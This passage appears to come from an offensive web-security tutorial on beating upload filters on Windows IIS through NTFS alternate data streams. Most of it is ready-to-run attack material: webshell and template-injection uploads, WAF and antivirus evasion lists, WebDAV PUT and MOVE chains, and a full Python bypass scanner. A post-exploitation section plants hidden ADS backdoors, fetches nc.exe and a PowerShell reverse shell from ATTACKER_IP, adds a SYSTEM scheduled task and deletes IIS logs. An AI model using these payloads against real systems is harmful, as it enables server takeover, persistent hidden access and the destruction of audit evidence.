  curl "https://target.com/uploads/shell.jsp?cmd=whoami"
  ```
  :::

  :::accordion-item{icon="i-lucide-gem" label="Node.js / Python on Windows"}
  ```bash [Terminal]
  # Node.js on Windows — multer/busboy/formidable behavior with ADS

  # Node.js typically uses the filename as-is on Windows
  curl -v -F "file=@shell.js;filename=shell.js::$DATA" https://target.com/upload

  # Overwrite server files via ADS + path traversal
  curl -v -F "file=@evil_index.js;filename=../../../app.js::$DATA" https://target.com/upload
  curl -v -F "file=@evil_package.json;filename=../../../package.json::$DATA" https://target.com/upload

  # Swig/EJS/Pug template injection via ADS upload
  cat > shell.ejs << 'EOF'
  <% const { execSync } = require('child_process'); %>
  <%= execSync(req.query.cmd).toString() %>
  EOF
  curl -v -F "file=@shell.ejs;filename=../views/shell.ejs::$DATA" https://target.com/upload

  # Python (Flask/Django) on Windows
  # Jinja2 template injection via ADS
  cat > shell.html << 'EOF'
  {{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
  EOF
  curl -v -F "file=@shell.html;filename=../templates/shell.html::$DATA" https://target.com/upload

  # Python pickle deserialization via ADS
  python3 -c "
  import pickle, os
  class Exploit(object):
      def __reduce__(self):
          return (os.system, ('calc.exe',))
  with open('evil.pkl', 'wb') as f:
      pickle.dump(Exploit(), f)
  "
  curl -v -F "file=@evil.pkl;filename=../data/session.pkl::$DATA" https://target.com/upload
  ```
  :::
::

---

## ADS-Based Antivirus & WAF Evasion

::tip
Alternate Data Streams are frequently invisible to security tools. Many antivirus engines, WAFs, and file scanners only inspect the default data stream of uploaded files, completely missing payloads hidden in named streams.
::

::tabs
  :::tabs-item{icon="i-lucide-scan" label="AV Evasion via Hidden Streams"}
  ```bash [Terminal]
  # Technique 1: Hide payload in ADS, execute via legitimate file

  # Create clean JPEG with PHP shell in ADS
  # Step 1: Upload clean image (passes AV scan)
  curl -v -F "file=@clean.jpg;filename=avatar.jpg" https://target.com/upload

  # Step 2: Write shell to ADS of uploaded image
  curl -v -F "file=@shell.php;filename=avatar.jpg:shell.php" https://target.com/upload

  # Step 3: Access hidden shell
  curl "https://target.com/uploads/avatar.jpg:shell.php?cmd=whoami"

  # Technique 2: Staged payload delivery via ADS
  # Upload payload in chunks across different ADS
  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload"

  # Split shell across multiple ADS
  parts = {
      "clean.jpg:p1": "<?php ",
      "clean.jpg:p2": "system(",
      "clean.jpg:p3": '$_GET["cmd"]',
      "clean.jpg:p4": "); ?>",
  }

  for fn, content in parts.items():
      files = {'file': (fn, content, 'image/jpeg')}
      r = requests.post(target, files=files, verify=False)
      print(f'{fn}: HTTP {r.status_code}')

  # Reassembly would happen server-side via include/require chain
  PYEOF

  # Technique 3: Binary payload in ADS (EXE/DLL hiding)
  # Upload legitimate file, then attach executable as ADS
  curl -v -F "file=@clean.doc;filename=report.doc" https://target.com/upload
  curl -v -F "file=@reverse_shell.exe;filename=report.doc:update.exe" https://target.com/upload

  # If code execution achieved, run hidden EXE from ADS
  # wmic process call create "C:\inetpub\wwwroot\uploads\report.doc:update.exe"
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="WAF Bypass via ADS Syntax"}
  ```bash [Terminal]
  # WAFs typically inspect filename extension from Content-Disposition
  # ADS syntax confuses extension extraction logic

  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload"
  payload = '<?php system($_GET["cmd"]); ?>'

  # Filenames designed to confuse WAF extension parsing
  waf_bypass_names = [
      # WAF sees extension as "$DATA" or no extension
      "shell.php::$DATA",
      
      # WAF may extract ".jpg" as extension
      "shell.php::$DATA.jpg",
      "shell.php:stream.jpg",
      "shell.php:safe.jpg:$DATA",
      
      # WAF confused by colons
      "shell:php",
      ":shell.php",
      "shell.php:",
      "shell:.php",
      
      # Multiple colons
      "shell.php:::$DATA",
      "shell.php::::$DATA",
      "shell:::php::$DATA",
      
      # ADS with safe-looking stream name
      "image.jpg:../../shell.php",
      "image.jpg:shell.php:$DATA",
      "document.pdf:shell.php",
      
      # Unicode + ADS
      "shell\u002ephp::$DATA",     # Unicode dot
      "shell\uff0ephp::$DATA",     # Fullwidth dot
      
      # Percent-encoded ADS
      "shell.php%3a%3a%24DATA",
      "shell.php%3A%3A$DATA",
      "shell.php::%24DATA",
  ]

  for fn in waf_bypass_names:
      body = (
          '--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="{fn}"\r\n'
          'Content-Type: image/jpeg\r\n\r\n'
          f'{payload}\r\n'
          '--BOUND--\r\n'
      )
      try:
          r = requests.post(target,
              headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
              data=body.encode('utf-8'), verify=False, timeout=10)
          indicator = '✅' if r.status_code in [200, 201, 302] else '❌'
          print(f'{indicator} {fn:45s} → HTTP {r.status_code}')
      except Exception as e:
          print(f'⚠️  {fn:45s} → ERROR')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Content Inspection Bypass"}
  ```bash [Terminal]
  # Some WAFs/scanners check file content for PHP tags
  # ADS can bypass content inspection when:
  # 1. Scanner checks default stream, but payload is in named stream
  # 2. Scanner reads file by name but ADS resolves differently

  # Upload clean content as default stream, PHP in ADS
  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload"

  # Part 1: Upload clean JPEG (content passes scanner)
  with open('clean.jpg', 'rb') as f:
      clean_data = f.read()

  files = {'file': ('avatar.jpg', clean_data, 'image/jpeg')}
  r = requests.post(target, files=files, verify=False)
  print(f'Clean upload: HTTP {r.status_code}')

  # Part 2: Upload PHP shell as ADS of same file
  shell = b'<?php system($_GET["cmd"]); ?>'
  files = {'file': ('avatar.jpg:shell.php', shell, 'image/jpeg')}
  r = requests.post(target, files=files, verify=False)
  print(f'ADS upload: HTTP {r.status_code}')

  # Part 3: Upload with JPEG magic bytes + PHP payload via ADS name
  # The file starts with JPEG headers (passes magic byte check)
  # But the filename targets an ADS
  payload = b'\xff\xd8\xff\xe0' + b'\x00' * 100 + b'<?php system($_GET["cmd"]); ?>'
  files = {'file': ('shell.php::$DATA', payload, 'image/jpeg')}
  r = requests.post(target, files=files, verify=False)
  print(f'Magic bytes + ADS: HTTP {r.status_code}')
  PYEOF
  ```
  :::
::

---

## ADS Exploitation via PUT/WebDAV

::accordion
  :::accordion-item{icon="i-lucide-upload" label="WebDAV PUT with ADS"}
  ```bash [Terminal]
  # WebDAV on IIS allows direct file creation via HTTP PUT
  # ADS in PUT request paths bypass extension restrictions

  # Basic PUT with ADS
  curl -v -X PUT "https://target.com/uploads/shell.php::$DATA" \
    -d '<?php system($_GET["cmd"]); ?>'

  curl -v -X PUT "https://target.com/uploads/shell.asp::$DATA" \
    -d '<% Set obj = CreateObject("WScript.Shell") : Set exec = obj.Exec("cmd /c " & Request("cmd")) : Response.Write(exec.StdOut.ReadAll()) %>'

  # WebDAV MOVE to rename after upload
  # Upload as safe extension
  curl -v -X PUT "https://target.com/uploads/shell.txt" \
    -d '<?php system($_GET["cmd"]); ?>'
  # Rename to PHP via MOVE with ADS
  curl -v -X MOVE "https://target.com/uploads/shell.txt" \
    -H "Destination: https://target.com/uploads/shell.php::$DATA"

  # WebDAV COPY with ADS
  curl -v -X COPY "https://target.com/uploads/shell.txt" \
    -H "Destination: https://target.com/uploads/shell.asp::$DATA"

  # WebDAV PROPFIND to enumerate ADS
  curl -v -X PROPFIND "https://target.com/uploads/" \
    -H "Depth: 1" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'

  # WebDAV MKCOL + PUT chain
  curl -v -X MKCOL "https://target.com/uploads/hidden/"
  curl -v -X PUT "https://target.com/uploads/hidden/shell.php::$DATA" \
    -d '<?php system($_GET["cmd"]); ?>'

  # Test WebDAV methods
  curl -v -X OPTIONS "https://target.com/uploads/" | grep -i "allow"

  # cadaver WebDAV client
  cadaver https://target.com/uploads/
  # put shell.php shell.php::$DATA
  # move shell.txt shell.php::$DATA
  # copy shell.txt shell.asp::$DATA
  ```
  :::

  :::accordion-item{icon="i-lucide-arrow-right-left" label="MOVE/COPY Method Chaining"}
  ```bash [Terminal]
  # Step 1: Upload with safe extension (passes filter)
  curl -X PUT "https://target.com/uploads/safe.txt" \
    -H "Content-Type: text/plain" \
    -d '<?php system($_GET["cmd"]); ?>'

  # Step 2: MOVE to executable extension via ADS
  curl -X MOVE "https://target.com/uploads/safe.txt" \
    -H "Destination: /uploads/shell.php::$DATA" \
    -H "Overwrite: T"

  # Variations of MOVE destination with ADS
  DESTINATIONS=(
    "/uploads/shell.php::$DATA"
    "/uploads/shell.php::$data"
    "/uploads/shell.asp::$DATA"
    "/uploads/shell.aspx::$DATA"
    "/uploads/shell.php. ::$DATA"
    "/uploads/shell.php..::$DATA"
    "/uploads/../shell.php::$DATA"
    "/uploads/shell.php%3a%3a%24DATA"
  )

  for dest in "${DESTINATIONS[@]}"; do
    # Re-upload source file
    curl -s -X PUT "https://target.com/uploads/safe.txt" -d 'SHELL'
    echo -n "MOVE to $dest → "
    curl -s -o /dev/null -w "%{http_code}" \
      -X MOVE "https://target.com/uploads/safe.txt" \
      -H "Destination: $dest" \
      -H "Overwrite: T"
    echo ""
  done

  # COPY method (preserves original)
  curl -X COPY "https://target.com/uploads/safe.txt" \
    -H "Destination: /uploads/shell.php::$DATA" \
    -H "Overwrite: T"

  # Batch exploitation
  for ext in php asp aspx ashx asmx jsp jspx cfm; do
    curl -s -X COPY "https://target.com/uploads/safe.txt" \
      -H "Destination: /uploads/shell.${ext}::$DATA" \
      -H "Overwrite: T"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/shell.${ext}?cmd=whoami")
    echo "shell.${ext}: HTTP $STATUS"
  done
  ```
  :::
::

---

## Automated ADS Bypass Scanner

::code-collapse

```python [ads_bypass.py]
#!/usr/bin/env python3
"""
NTFS ADS Upload Bypass Scanner
Tests file upload endpoints against ADS-based extension filter bypasses,
path traversal combinations, and IIS-specific tricks.
"""
import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()

class ADSBypassScanner:
    def __init__(self, target_url, field_name='file', verify_ssl=False, proxy=None):
        self.target = target_url
        self.field_name = field_name
        self.session = requests.Session()
        self.session.verify = verify_ssl
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.results = []
        self.shell_payload = '<?php system($_GET["cmd"]); ?>'
        self.asp_payload = '<% Set o=CreateObject("WScript.Shell"):Set e=o.Exec("cmd /c "&Request("cmd")):Response.Write(e.StdOut.ReadAll()) %>'
        self.aspx_payload = '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics"%><% if(Request["cmd"]!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());} %>'

    def send_upload(self, filename, content, content_type='image/jpeg', label=''):
        """Upload file with given filename"""
        try:
            body = (
                '--BOUND\r\n'
                f'Content-Disposition: form-data; name="{self.field_name}"; filename="{filename}"\r\n'
                f'Content-Type: {content_type}\r\n'
                '\r\n'
                f'{content}\r\n'
                '--BOUND--\r\n'
            )
            r = self.session.post(
                self.target,
                headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
                data=body.encode('latin-1'),
                timeout=15
            )
            success = r.status_code in [200, 201, 302, 301]
            result = {
                'filename': filename,
                'label': label,
                'status': r.status_code,
                'length': len(r.text),
                'success': success,
            }
            self.results.append(result)
            icon = '✅' if success else '❌'
            print(f'  {icon} [{r.status_code}] [{len(r.text):>6}B] {label}: {filename}')
            return result
        except Exception as e:
            print(f'  ⚠️  [ERR] {label}: {filename} → {e}')
            return None

    def test_data_stream_bypass(self):
        """Test ::$DATA stream variations"""
        print("\n[*] Testing ::$DATA stream bypass...")
        payloads = [
            ("shell.php::$DATA", "Basic ::$DATA"),
            ("shell.php::$data", "Lowercase $data"),
            ("shell.php::$Data", "Mixed case $Data"),
            ("shell.php::$DATA ", "Trailing space"),
            ("shell.php::$DATA.", "Trailing dot"),
            ("shell.php.::$DATA", "Dot before ::$DATA"),
            ("shell.php..::$DATA", "Double dot before"),
            ("shell.php...::$DATA", "Triple dot before"),
            ("shell.php :::$DATA", "Space + triple colon"),
            ("shell.php:::$DATA", "Triple colon"),
            ("shell.php::::$DATA", "Quad colon"),
            ("shell.php:$DATA", "Single colon"),
            ("shell.php:$DATA:", "Single colon trailing"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_asp_variants(self):
        """Test ASP/ASPX/ASHX with ADS"""
        print("\n[*] Testing ASP/ASPX variants with ADS...")
        payloads = [
            ("shell.asp::$DATA", self.asp_payload, "ASP ::$DATA"),
            ("shell.aspx::$DATA", self.aspx_payload, "ASPX ::$DATA"),
            ("shell.ashx::$DATA", self.aspx_payload, "ASHX ::$DATA"),
            ("shell.asmx::$DATA", self.aspx_payload, "ASMX ::$DATA"),
            ("shell.cer::$DATA", self.asp_payload, "CER ::$DATA"),
            ("shell.asa::$DATA", self.asp_payload, "ASA ::$DATA"),
            ("shell.asp.::$DATA", self.asp_payload, "ASP dot ::$DATA"),
            ("shell.aspx.::$DATA", self.aspx_payload, "ASPX dot ::$DATA"),
        ]
        for fn, payload, label in payloads:
            self.send_upload(fn, payload, label=label)

    def test_named_streams(self):
        """Test named ADS"""
        print("\n[*] Testing named alternate data streams...")
        payloads = [
            ("image.jpg:shell.php", "Named stream .php"),
            ("image.jpg:shell.php:$DATA", "Named stream explicit $DATA"),
            ("image.jpg:shell.asp", "Named stream .asp"),
            ("image.jpg:s", "Single char stream"),
            ("image.jpg:.", "Dot stream"),
            ("image.jpg:shell", "No extension stream"),
            (".:shell.php", "Current dir ADS"),
            ("..:shell.php", "Parent dir ADS"),
            ("uploads:shell.php", "Directory ADS"),
            ("web.config:shell.php", "Config file ADS"),
            ("index.html:shell.php", "Index file ADS"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_double_extension_ads(self):
        """Test double extensions with ADS"""
        print("\n[*] Testing double extension + ADS combinations...")
        payloads = [
            ("shell.php.jpg::$DATA", "PHP.JPG ::$DATA"),
            ("shell.jpg.php::$DATA", "JPG.PHP ::$DATA"),
            ("shell.php.png::$DATA", "PHP.PNG ::$DATA"),
            ("shell.php.txt::$DATA", "PHP.TXT ::$DATA"),
            ("shell.asp.jpg::$DATA", "ASP.JPG ::$DATA"),
            ("shell.aspx.png::$DATA", "ASPX.PNG ::$DATA"),
            ("shell.php.config::$DATA", "PHP.CONFIG ::$DATA"),
            ("shell.jpg::$DATA.php", "ADS between extensions"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_url_encoded_ads(self):
        """Test URL-encoded ADS"""
        print("\n[*] Testing URL-encoded ADS syntax...")
        payloads = [
            ("shell.php%3a%3a%24DATA", "Fully encoded"),
            ("shell.php%3A%3A%24DATA", "Uppercase encoded"),
            ("shell.php::%24DATA", "Only $ encoded"),
            ("shell.php%3a%3a$DATA", "Colons encoded"),
            ("shell%2ephp::$DATA", "Dot encoded"),
            ("shell.php%253a%253a%2524DATA", "Double encoded"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_trailing_chars(self):
        """Test trailing characters with ADS"""
        print("\n[*] Testing trailing character + ADS combos...")
        payloads = [
            ("shell.php.", "Trailing dot"),
            ("shell.php..", "Double trailing dot"),
            ("shell.php...", "Triple trailing dot"),
            ("shell.php ", "Trailing space"),
            ("shell.php  ", "Double trailing space"),
            ("shell.php. ", "Dot + space"),
            ("shell.php .::$DATA", "Space dot ADS"),
            ("shell.php. .::$DATA", "Dot space dot ADS"),
            ("shell.php...::$DATA", "Triple dot ADS"),
            ("shell.php   ::$DATA", "Triple space ADS"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_path_traversal_ads(self):
        """Test path traversal with ADS"""
        print("\n[*] Testing path traversal + ADS combinations...")
        payloads = [
            ("../shell.php::$DATA", "Parent dir ::$DATA"),
            ("..\\shell.php::$DATA", "Backslash parent ::$DATA"),
            ("../../shell.php::$DATA", "Double parent ::$DATA"),
            ("..\\..\\shell.php::$DATA", "Double backslash parent"),
            ("....//shell.php::$DATA", "Double dot slash"),
            ("..%5cshell.php::$DATA", "Encoded backslash"),
            ("..%2fshell.php::$DATA", "Encoded slash"),
            ("%2e%2e/shell.php::$DATA", "Encoded dots"),
            ("..\\..\\..\\inetpub\\wwwroot\\shell.php::$DATA", "Full path"),
        ]
        for fn, label in payloads:
            self.send_upload(fn, self.shell_payload, label=label)

    def test_iis_tricks(self):
        """Test IIS-specific tricks with ADS"""
        print("\n[*] Testing IIS-specific ADS tricks...")
        payloads = [
            ("shell.asp;.jpg::$DATA", "Semicolon + ADS"),
            ("shell.php;.jpg::$DATA", "PHP semicolon + ADS"),
            ("shell.aspx;.jpg::$DATA", "ASPX semicolon + ADS"),
            ("SHELL~1.PHP::$DATA", "8.3 short name + ADS"),
            ("SHELL~1.ASP::$DATA", "8.3 short name ASP"),
            ("web.config::$DATA", "web.config ::$DATA"),
            (".htaccess::$DATA", ".htaccess ::$DATA"),
            ("shell.php/::$DATA", "Trailing slash + ADS"),
            ("shell.php\\::$DATA", "Trailing backslash + ADS"),
        ]

        for fn, label in payloads:
            payload = self.shell_payload
            if 'asp' in fn.lower() and 'aspx' not in fn.lower():
                payload = self.asp_payload
            elif 'aspx' in fn.lower():
                payload = self.aspx_payload
            elif 'web.config' in fn.lower():
                payload = '<?xml version="1.0"?><configuration></configuration>'
            self.send_upload(fn, payload, label=label)

    def test_null_byte_ads(self):
        """Test null byte + ADS combinations"""
        print("\n[*] Testing null byte + ADS combinations...")
        filenames = [
            (b"shell.php::$DATA\x00.jpg", "ADS + null + jpg"),
            (b"shell.php\x00.jpg::$DATA", "Null before ADS"),
            (b"shell.php::$DATA\x00", "ADS + null terminator"),
            (b"shell.php\x00::$DATA", "Null between name and ADS"),
            (b"shell.asp::$DATA\x00.jpg", "ASP ADS null jpg"),
        ]
        for fn_bytes, label in filenames:
            body = (
                b'--BOUND\r\n'
                b'Content-Disposition: form-data; name="' + self.field_name.encode() + b'"; filename="' + fn_bytes + b'"\r\n'
                b'Content-Type: image/jpeg\r\n\r\n'
                + self.shell_payload.encode() +
                b'\r\n--BOUND--\r\n'
            )
            try:
                r = self.session.post(self.target,
                    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
                    data=body, timeout=15)
                icon = '✅' if r.status_code in [200, 201, 302] else '❌'
                print(f'  {icon} [{r.status_code}] [{len(r.text):>6}B] {label}')
                self.results.append({'filename': label, 'status': r.status_code,
                    'success': r.status_code in [200, 201, 302], 'label': label, 'length': len(r.text)})
            except Exception as e:
                print(f'  ⚠️  [ERR] {label}: {e}')

    def run_all(self):
        """Execute all test categories"""
        print(f"\n{'='*70}")
        print(f"  NTFS ADS Upload Bypass Scanner — {self.target}")
        print(f"{'='*70}")

        self.test_data_stream_bypass()
        self.test_asp_variants()
        self.test_named_streams()
        self.test_double_extension_ads()
        self.test_url_encoded_ads()
        self.test_trailing_chars()
        self.test_path_traversal_ads()
        self.test_iis_tricks()
        self.test_null_byte_ads()

        print(f"\n{'='*70}")
        print(f"  RESULTS SUMMARY")
        print(f"{'='*70}")
        success = [r for r in self.results if r.get('success')]
        print(f"  Total tests:  {len(self.results)}")
        print(f"  Successful:   {len(success)}")
        print(f"  Failed:       {len(self.results) - len(success)}")
        if success:
            print(f"\n  ✅ Successful bypasses:")
            for r in success:
                print(f"     [{r['status']}] {r['label']}: {r.get('filename', 'N/A')}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='NTFS ADS Upload Bypass Scanner')
    parser.add_argument('-t', '--target', required=True, help='Upload endpoint URL')
    parser.add_argument('-f', '--field', default='file', help='Form field name (default: file)')
    parser.add_argument('-p', '--proxy', default=None, help='Proxy URL')
    parser.add_argument('--category', choices=[
        'data', 'asp', 'named', 'double', 'encoded', 'trailing',
        'traversal', 'iis', 'null', 'all'
    ], default='all', help='Test category')
    args = parser.parse_args()

    scanner = ADSBypassScanner(args.target, args.field, proxy=args.proxy)
    
    category_map = {
        'data': scanner.test_data_stream_bypass,
        'asp': scanner.test_asp_variants,
        'named': scanner.test_named_streams,
        'double': scanner.test_double_extension_ads,
        'encoded': scanner.test_url_encoded_ads,
        'trailing': scanner.test_trailing_chars,
        'traversal': scanner.test_path_traversal_ads,
        'iis': scanner.test_iis_tricks,
        'null': scanner.test_null_byte_ads,
        'all': scanner.run_all,
    }
    
    category_map[args.category]()
```

::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Scanner Usage"}
  ```bash [Terminal]
  # Run full ADS bypass scan
  python3 ads_bypass.py -t https://target.com/upload --category all

  # Test only ::$DATA variations
  python3 ads_bypass.py -t https://target.com/upload --category data

  # Test ASP/ASPX variants
  python3 ads_bypass.py -t https://target.com/upload --category asp

  # Test named streams
  python3 ads_bypass.py -t https://target.com/upload --category named

  # With Burp proxy
  python3 ads_bypass.py -t https://target.com/upload -p http://127.0.0.1:8080 --category all

  # Custom field name
  python3 ads_bypass.py -t https://target.com/api/avatar -f avatar --category all

  # Test IIS-specific tricks
  python3 ads_bypass.py -t https://target.com/upload --category iis

  # Test path traversal + ADS
  python3 ads_bypass.py -t https://target.com/upload --category traversal
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Manual Quick Test"}
  ```bash [Terminal]
  # Quick one-liner ADS bypass test
  for fn in "shell.php::$DATA" "shell.asp::$DATA" "shell.aspx::$DATA" \
    "shell.php.::$DATA" "shell.php..::$DATA" "shell.php.jpg::$DATA" \
    "shell.php%3a%3a%24DATA" "image.jpg:shell.php"; do
    echo -n "$fn → "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@shell.php;filename=${fn};type=image/jpeg" \
      https://target.com/upload
    echo ""
  done

  # Verify execution after upload
  for path in "shell.php" "shell.asp" "shell.aspx" "SHELL~1.PHP" \
    "shell.php::$DATA" "image.jpg:shell.php"; do
    echo -n "Checking $path → "
    curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/uploads/${path}?cmd=whoami"
    echo ""
  done
  ```
  :::
::

---

## Post-Exploitation via ADS

::steps{level="4"}

#### Establish Initial Webshell

```bash [Terminal]
# Upload PHP shell via ADS bypass
curl -F "file=@shell.php;filename=shell.php::$DATA;type=image/jpeg" https://target.com/upload

# Verify execution
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=hostname"
curl "https://target.com/uploads/shell.php?cmd=ipconfig+/all"
```

#### Hide Persistent Backdoor in ADS

```bash [Terminal]
# Use webshell to write hidden backdoor into ADS of existing file
# This survives simple file deletion of uploaded shells

# Write backdoor to ADS of system file
curl "https://target.com/uploads/shell.php?cmd=echo+^<?php+system($_GET['cmd']);+?^>+>+C:\inetpub\wwwroot\iisstart.htm:backdoor.php"

# Verify hidden backdoor
curl "https://target.com/iisstart.htm:backdoor.php?cmd=whoami"

# Write to directory ADS
curl "https://target.com/uploads/shell.php?cmd=echo+^<?php+system($_GET['cmd']);+?^>+>+C:\inetpub\wwwroot\uploads:hidden.php"

# List all ADS on server
curl "https://target.com/uploads/shell.php?cmd=dir+/r+C:\inetpub\wwwroot\"

# Hide executable in ADS
curl "https://target.com/uploads/shell.php?cmd=certutil+-urlcache+-split+-f+http://ATTACKER_IP/nc.exe+C:\inetpub\wwwroot\favicon.ico:nc.exe"

# Execute hidden binary from ADS
curl "https://target.com/uploads/shell.php?cmd=wmic+process+call+create+C:\inetpub\wwwroot\favicon.ico:nc.exe+-e+cmd.exe+ATTACKER_IP+4444"
```

#### Establish Reverse Shell via ADS

```bash [Terminal]
# Download reverse shell to ADS
curl "https://target.com/uploads/shell.php?cmd=certutil+-urlcache+-split+-f+http://ATTACKER_IP/revshell.exe+C:\Windows\Temp\svchost.exe:update.exe"

# PowerShell reverse shell via ADS
curl --data-urlencode "cmd=powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/ps_rev.ps1')\" > C:\Windows\Temp\log.txt:ps.ps1" \
  "https://target.com/uploads/shell.php"

# Execute from ADS
curl "https://target.com/uploads/shell.php?cmd=powershell+-ep+bypass+-File+C:\Windows\Temp\log.txt:ps.ps1"

# Scheduled task pointing to ADS binary
curl --data-urlencode "cmd=schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\Temp\svchost.exe:update.exe\" /sc onstart /ru SYSTEM" \
  "https://target.com/uploads/shell.php"
```

#### Clean Tracks & Maintain Access

```bash [Terminal]
# Remove original uploaded webshell (backdoor persists in ADS)
curl "https://target.com/uploads/shell.php?cmd=del+C:\inetpub\wwwroot\uploads\shell.php"

# Verify main file looks clean
curl "https://target.com/uploads/shell.php"    # 404
curl "https://target.com/iisstart.htm"          # Normal page
curl "https://target.com/iisstart.htm:backdoor.php?cmd=whoami"  # Still works

# Clear IIS logs
curl "https://target.com/iisstart.htm:backdoor.php?cmd=del+C:\inetpub\logs\LogFiles\W3SVC1\*.log"

# Enumerate all hidden ADS on the server for cleanup
curl --data-urlencode "cmd=powershell Get-ChildItem C:\inetpub\wwwroot -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } | Where-Object { $_.Stream -ne ':$DATA' }" \
  "https://target.com/iisstart.htm:backdoor.php"
```

::

---

## Attack Flow Diagram

::code-collapse

```text [NTFS ADS Upload Bypass Attack Flow]
┌──────────────────────────────────────────────────────────────────────┐
│                        RECONNAISSANCE                                │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────────┐  ┌───────────────────┐  ┌──────────────────┐  │
│  │ Identify Windows │  │ Enumerate Upload  │  │ Fingerprint IIS  │  │
│  │ + NTFS Target    │─▶│ Endpoints &       │─▶│ Version &        │  │
│  │ (IIS headers)    │  │ Extension Filters │  │ Handler Mappings │  │
│  └──────────────────┘  └───────────────────┘  └────────┬─────────┘  │
│                                                         │            │
│  ┌──────────────────────────────────────────────────────┘            │
│  │  Detection Methods:                                               │
│  │  • Server: Microsoft-IIS/X.X header                              │
│  │  • X-Powered-By: ASP.NET                                        │
│  │  • File extension restrictions (.php/.asp blocked)               │
│  │  • Error pages revealing IIS/Windows paths                       │
│  │  • WebDAV OPTIONS response                                       │
│  └──────────────────────────────────────────────────────────────────┘│
└──────────────────────────────────────────────────────────────────────┘
                               │
┌──────────────────────────────┼───────────────────────────────────────┐
│                              ▼                                       │
│              ┌───────────────────────────────┐                       │
│              │    ADS BYPASS TECHNIQUES      │                       │
│              └───────────────┬───────────────┘                       │
│                              │                                       │
│    ┌─────────────────────────┼─────────────────────────┐            │
│    │                         │                         │            │
│    ▼                         ▼                         ▼            │
│ ┌─────────────┐  ┌──────────────────┐  ┌──────────────────────┐    │
│ │ ::$DATA     │  │ Named Streams    │  │ Combination          │    │
│ │ Bypass      │  │                  │  │ Attacks              │    │
│ ├─────────────┤  ├──────────────────┤  ├──────────────────────┤    │
│ │ .php::$DATA │  │ img.jpg:shell.php│  │ ::$DATA + dots       │    │
│ │ .asp::$DATA │  │ .:shell.php      │  │ ::$DATA + spaces     │    │
│ │ .aspx::$DATA│  │ ..:shell.php     │  │ ::$DATA + double ext │    │
│ │ .jsp::$DATA │  │ dir:shell.php    │  │ ::$DATA + null byte  │    │
│ │ .php.::$DATA│  │ config:shell.php │  │ ::$DATA + URL encode │    │
│ │ .php..::$DAT│  │ favicon:shell.php│  │ ::$DATA + traversal  │    │
│ │ Case variant│  │                  │  │ ::$DATA + semicolon  │    │
│ └──────┬──────┘  └────────┬─────────┘  └──────────┬───────────┘    │
│        │                  │                        │                │
│        └──────────────────┼────────────────────────┘                │
│                           │                                         │
│                           ▼                                         │
│              ┌──────────────────────────┐                           │
│              │   UPLOAD VECTOR          │                           │
│              ├──────────────────────────┤                           │
│              │ • Multipart form upload  │                           │
│              │ • PUT/WebDAV direct      │                           │
│              │ • MOVE/COPY rename       │                           │
│              │ • API file parameter     │                           │
│              │ • Base64 upload endpoint │                           │
│              └────────────┬─────────────┘                           │
│                           │                                         │
│                           ▼                                         │
│              ┌──────────────────────────┐                           │
│              │   VALIDATION LAYER       │                           │
│              ├──────────────────────────┤                           │
│              │                          │                           │
│              │  WAF sees:               │                           │
│              │  filename="shell.php     │                           │
│              │           ::$DATA"       │                           │
│              │  Extension = "$DATA"     │                           │
│              │  → PASS ✅               │                           │
│              │                          │                           │
│              │  Server writes:          │                           │
│              │  NTFS strips "::$DATA"   │                           │
│              │  → shell.php saved       │                           │
│              │  → IIS executes PHP ✅   │                           │
│              │                          │                           │
│              └────────────┬─────────────┘                           │
│                           │                                         │
└───────────────────────────┼─────────────────────────────────────────┘
                            │
┌───────────────────────────┼─────────────────────────────────────────┐
│                           ▼                                         │
│              ┌──────────────────────────┐                           │
│              │   CODE EXECUTION         │                           │
│              ├──────────────────────────┤                           │
│              │                          │                           │
│              │  ┌────────────────────┐  │                           │
│              │  │ Direct Webshell    │  │                           │
│              │  │ /uploads/shell.php │  │                           │
│              │  └─────────┬──────────┘  │                           │
│              │            │             │                           │
│              │            ▼             │                           │
│              │  ┌────────────────────┐  │                           │
│              │  │ Hide in ADS        │  │                           │
│              │  │ file.htm:backdoor  │  │                           │
│              │  └─────────┬──────────┘  │                           │
│              │            │             │                           │
│              │            ▼             │                           │
│              │  ┌────────────────────┐  │                           │
│              │  │ Reverse Shell      │  │                           │
│              │  │ from ADS binary    │  │                           │
│              │  └─────────┬──────────┘  │                           │
│              │            │             │                           │
│              │            ▼             │                           │
